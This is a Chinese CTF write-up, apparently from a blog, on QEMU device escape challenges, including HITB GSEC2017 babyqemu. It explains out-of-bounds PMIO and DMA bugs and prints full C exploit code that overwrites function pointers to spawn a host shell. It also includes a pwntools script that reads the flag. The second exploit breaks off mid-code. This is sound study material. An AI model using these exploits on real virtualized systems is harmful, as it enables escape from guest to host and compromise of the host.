href="#一些信息搜集" class="headerlink" title="一些信息搜集"></a>一些信息搜集</h3><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311261732331.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311261739772.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311261739286.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311261740983.png"></p><p>MMIO地址为0xfebf1000，大小为256；PMIO地址为0xc050，总共有8个端口.<br>查看内存  start-address — end-address — flags<br>或者 /proc/iomem,/proc/ioports<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311261743445.png"></p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>看pmio_read和pmio_write,一眼越界读写,write时设置qpaque-&gt;addr,之后再作为下标进行任意读写.还给了能布置参数的函数指针调用,先读函数指针泄露地址再改函数指针执行system(‘sh’).</p><p>解释一下这两个函数的参数.addr是要操作的port - portbase(PMIO),size是这次IO操作的字节数,val是要写入的值.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311271703440.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311271704300.png"></p><p>顺便提一下,mmio_read看起来也很像越界读写,但其实addr是有限制的,因为只有在读写MMIO区域时Qemu模拟才会调用这俩函数.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311271708372.png"></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>有个不合理但其实也合理但我不接受的点是,32位下编译,uint64_t == unsigned long即32位无符号整型…</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HEX(x) printf(<span class="string">"[*]0x%016llx\n"</span>, (unsigned long long)x)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LOG(addr) printf(<span class="string">"[*]%s\n"</span>, addr)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_SHIFT 12</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_SIZE (1 &lt;&lt; PAGE_SHIFT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PFN_PRESENT (1ull &lt;&lt; 63)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PFN_PFN ((1ull &lt;&lt; 55) - 1)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LOWMASK 0xffffffff</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HIGHMASK 0xffffffff00000000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">uint64_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> pmio_base = <span class="number">0x000000000000c050</span>;</span><br><span class="line"><span class="type">void</span> * mmio_mem;</span><br><span class="line"><span class="type">char</span>* userbuf;</span><br><span class="line"><span class="type">uint64_t</span> phy_userbuf;</span><br><span class="line"><span class="type">int</span> fd;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Err</span><span class="params">(<span class="type">char</span>* err)</span>{</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Error: %s\n"</span>, err);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">page_offset</span><span class="params">(<span class="type">uint32_t</span> addr)</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">return</span> addr &amp; ((<span class="number">1</span> &lt;&lt; PAGE_SHIFT) - <span class="number">1</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">gva_to_gfn</span><span class="params">(<span class="type">void</span> *addr)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">uint64_t</span> pme, gfn;</span><br><span class="line">    <span class="type">size_t</span> offset;</span><br><span class="line">    offset = ((<span class="type">uintptr_t</span>)addr &gt;&gt; <span class="number">9</span>) &amp; ~<span class="number">7</span>;</span><br><span class="line">    <span class="comment">// ((uintptr_t)addr &gt;&gt; 12)&lt;&lt;3</span></span><br><span class="line">    lseek(fd, offset, SEEK_SET);</span><br><span class="line">    read(fd, &amp;pme, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span> (!(pme &amp; PFN_PRESENT))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    gfn = pme &amp; PFN_PFN;</span><br><span class="line">    <span class="keyword">return</span> gfn;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* transfer visual address to physic address</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">gva_to_gpa</span><span class="params">(<span class="type">void</span> *addr)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">uint64_t</span> gfn = gva_to_gfn(addr);</span><br><span class="line">    <span class="keyword">return</span> (gfn &lt;&lt; PAGE_SHIFT) | page_offset((<span class="type">uint64_t</span>)addr);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">va2pa</span><span class="params">(<span class="type">void</span> *addr)</span>{</span><br><span class="line">    <span class="type">uint64_t</span> data;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> pagesize = getpagesize();</span><br><span class="line">    <span class="type">size_t</span> offset = ((<span class="type">uintptr_t</span>)addr / pagesize) * <span class="keyword">sizeof</span>(<span class="type">uint64_t</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(lseek(fd,offset,SEEK_SET) &lt; <span class="number">0</span>){</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"lseek"</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(read(fd,&amp;data,<span class="number">8</span>) != <span class="number">8</span>){</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"read"</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(data &amp; (((<span class="type">uint64_t</span>)<span class="number">1</span> &lt;&lt; <span class="number">63</span>)))){</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"page"</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> pageframenum = data &amp; ((<span class="number">1ull</span> &lt;&lt; <span class="number">55</span>) - <span class="number">1</span>);</span><br><span class="line">    <span class="type">size_t</span> phyaddr = pageframenum * pagesize + (<span class="type">uintptr_t</span>)addr % pagesize;</span><br><span class="line"></span><br><span class="line">    close(fd);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> phyaddr;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">mmio_read</span><span class="params">(<span class="type">uint32_t</span> addr)</span>{</span><br><span class="line">    <span class="keyword">return</span> *( (<span class="type">uint32_t</span> *)mmio_mem + addr );</span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write</span><span class="params">(<span class="type">uint32_t</span> addr,<span class="type">uint32_t</span> val )</span>{</span><br><span class="line">    *((<span class="type">uint32_t</span> *)mmio_mem + addr) = val;</span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">pmio_write</span><span class="params">(<span class="type">uint32_t</span> addr,<span class="type">uint32_t</span> val)</span>{</span><br><span class="line">    outl(val,addr);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">pmio_writeb</span><span class="params">(<span class="type">uint32_t</span> addr,<span class="type">uint8_t</span> val)</span>{</span><br><span class="line">    outb(val,addr);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">pmio_read</span><span class="params">(<span class="type">uint32_t</span> addr)</span>{</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">uint32_t</span>)inl(addr);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">pmio_readb</span><span class="params">(<span class="type">uint32_t</span> addr)</span>{</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">uint8_t</span>)inb(addr);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init_mmio</span><span class="params">()</span>{</span><br><span class="line">    <span class="type">int</span> mmio_fd = open(<span class="string">"/sys/devices/pci0000:00/0000:00:04.0/resource0"</span>, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span>(mmio_fd &lt; <span class="number">0</span>){</span><br><span class="line">        Err(<span class="string">"Open pci"</span>);</span><br><span class="line">    }</span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(mmio_mem&lt;<span class="number">0</span>){</span><br><span class="line">        Err(<span class="string">"mmap mmio_mem"</span>);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">pmio_arbread</span><span class="params">(<span class="type">uint32_t</span> offset)</span></span><br><span class="line">{</span><br><span class="line">    pmio_write(pmio_base,offset);</span><br><span class="line">    <span class="keyword">return</span> pmio_read(pmio_base+<span class="number">4</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">pmio_arbwrite</span><span class="params">(<span class="type">uint32_t</span> offset,<span class="type">uint32_t</span> val)</span></span><br><span class="line">{</span><br><span class="line">    pmio_write(pmio_base,offset);</span><br><span class="line">    pmio_write(pmio_base+<span class="number">4</span>,val);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">if</span> (iopl(<span class="number">3</span>) !=<span class="number">0</span> )</span><br><span class="line">        Err(<span class="string">"I/O permission is not enough"</span>);</span><br><span class="line">    <span class="type">uint64_t</span> srand_addr = <span class="number">0</span>;</span><br><span class="line">    srand_addr |= pmio_arbread((<span class="number">0xBF8</span><span class="number">-0xAF4</span>));</span><br><span class="line">    srand_addr |= (pmio_arbread(((<span class="number">0xBF8</span><span class="number">-0xAF4</span>))+<span class="number">4</span>) &lt;&lt; <span class="number">32</span>);</span><br><span class="line">    HEX(srand_addr);</span><br><span class="line"></span><br><span class="line">    <span class="type">uint64_t</span> system_addr = srand_addr+<span class="number">0xacd0</span>ULL;</span><br><span class="line">    LOG(<span class="string">"system:"</span>);</span><br><span class="line">    HEX(system_addr);</span><br><span class="line"></span><br><span class="line">    LOG(<span class="string">"Prepare:"</span>);</span><br><span class="line">    <span class="comment">// uint64_t binsh_addr = srand_addr+0x1925f8;</span></span><br><span class="line">    pmio_arbwrite((<span class="number">0xc08</span><span class="number">-0xAF4</span>),system_addr&amp;LOWMASK);</span><br><span class="line">    pmio_arbwrite(((<span class="number">0xc08</span><span class="number">-0xAF4</span>))+<span class="number">4</span>,(system_addr&gt;&gt;<span class="number">32</span>));</span><br><span class="line">    pmio_arbwrite(<span class="number">2</span>*<span class="number">4</span>,<span class="number">0x6873</span>);</span><br><span class="line">    LOG(<span class="string">"Triger:"</span>);</span><br><span class="line">    pmio_arbwrite(<span class="number">3</span>*<span class="number">4</span>,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>还有一个不是很理解的点,system(‘sh’)后没办法正常交互(感觉Qemu进程异常退出后就经常出现这种情况),因为此时输入回车发送的实际上是’\r’,但shell是以’\n’终止的,所以会一直等待输入,不过可以用ctrl+J发送’\n’…<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311271628072.png"><br>改用python交互或者直接system(‘cat /flag’)或CTRL+J.</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">io = process(<span class="string">'./launch.sh'</span>,shell=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">'ubuntu login: '</span>,<span class="string">b'ubuntu'</span>)</span><br><span class="line">io.sendlineafter(<span class="string">'Password:'</span>,<span class="string">b'passw0rd'</span>)</span><br><span class="line">io.sendlineafter(<span class="string">'$'</span>,<span class="string">'sudo ./exp'</span>)</span><br><span class="line">pause()</span><br><span class="line">io.send(<span class="string">'cat /flag\n'</span>)</span><br><span class="line"></span><br><span class="line">flag = io.recv()</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure><h2 id="HITB-GSEC2017-babyqemu"><a href="#HITB-GSEC2017-babyqemu" class="headerlink" title="HITB GSEC2017 babyqemu"></a>HITB GSEC2017 babyqemu</h2><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><p>依赖库的版本太老了,懒得一个一个换,关掉kvm用docker来跑,<br>刚开始的方案是gdbserver启远程调试,一个比较阴间问题的是gdb continue阻塞时要用SIGINT来取消,target remote也是用SIGINT来终止,一阻塞就断开连接,调得很难受.<br>(如果有人知道咋解决可以告诉我一下~)</p><p>后来仔细一想,Docker的隔离只是命名空间而已,容器的pid命名空间对主机是可见的,可以直接attach上去.</p><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>关键结构体belike:</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">attribute__</span>((<span class="title">aligned</span>(16))) <span class="title">HitbState</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">  PCIDevice_0 pdev;</span><br><span class="line">  MemoryRegion_0 mmio;</span><br><span class="line">  QemuThread_0 thread;</span><br><span class="line">  QemuMutex_0 thr_mutex;</span><br><span class="line">  QemuCond_0 thr_cond;</span><br><span class="line">  <span class="type">bool</span> stopping;</span><br><span class="line">  <span class="type">uint32_t</span> addr4;</span><br><span class="line">  <span class="type">uint32_t</span> fact;</span><br><span class="line">  <span class="type">uint32_t</span> status;</span><br><span class="line">  <span class="type">uint32_t</span> irq_status;</span><br><span class="line">  dma_state dma;</span><br><span class="line">  QEMUTimer_0 dma_timer;</span><br><span class="line">  <span class="type">char</span> dma_buf[<span class="number">4096</span>];</span><br><span class="line">  <span class="type">void</span> (*enc)(<span class="type">char</span> *, <span class="type">unsigned</span> <span class="type">int</span>);</span><br><span class="line">  <span class="type">uint64_t</span> dma_mask;</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dma_state</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">  <span class="type">dma_addr_t</span> src;</span><br><span class="line">  <span class="type">dma_addr_t</span> dst;</span><br><span class="line">  <span class="type">dma_addr_t</span> cnt;</span><br><span class="line">  <span class="type">dma_addr_t</span> cmd;</span><br><span class="line">};</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>hitb设备只有mmio交互,功能就是读取和设置dma_state结构体的四个成员.write还有一个关键命令,可以设置timer的到期时间(100ms之后)<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311281759682.png"></p><p>再来看这个timer,realize函数中可以注册了回调函数hitb_dma_timer,刻度1ms<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311281756440.png"></p><p>漏洞点就在这个hitb_dma_timer了.两个功能,从物理地址读取数据到dma_buf,将dma_buf中的数据写入到物理地址.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">cpu_physical_memory_rw</span><span class="params">(hwaddr addr, <span class="type">uint8_t</span> *buf,<span class="type">int</span> len, <span class="type">int</span> is_write)</span>;</span><br></pre></td></tr></tbody></table></figure><p>dma_buf的索引在write和read的时候分别是dma_state.src和dma_state.dst(从src/dst得到索引的操作其实是相同的,伪C代码有点逆天).<br>没有限制,所以可以越界读写.还是越界读写一个函数指针enc,改到system的PLT表即可.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311281756532.png"></p><p>顺便练下gpa到hva的转换,这里的gpa是0x1f72d90<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311281632876.png"><br>查看Qemu进程的vmmap找到Guest的物理空间,(64MB = 0x40*0x1000*0x1000B)<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311281632289.png"><br>计算hva == gpa+hpa,查看写入前该地址的8字节数据<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311281632904.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311281633037.png"><br>写入后再次查看,已经被修改为hitb_enc.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311281633367.png"></p><p>在write操作增加timer时间后要进行sleep,来等待timer回调</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><p>(多提一句,exp中的copy_from_dma其实应该是copy_to_dma_buf</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HEX(x) printf(<span class="string">"[*]0x%016llx\n"</span>, (unsigned long long)x)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LOG(addr) printf(<span class="string">"[*]%s\n"</span>, addr)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_SHIFT 12</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_SIZE (1 &lt;&lt; PAGE_SHIFT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PFN_PRESENT (1ull &lt;&lt; 63)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PFN_PFN ((1ull &lt;&lt; 55) - 1)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LOWMASK 0xffffffff</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HIGHMASK 0xffffffff00000000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">uint64_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> pmio_base = <span class="number">0x000000000000c050</span>;</span><br><span class="line"><span class="type">void</span> 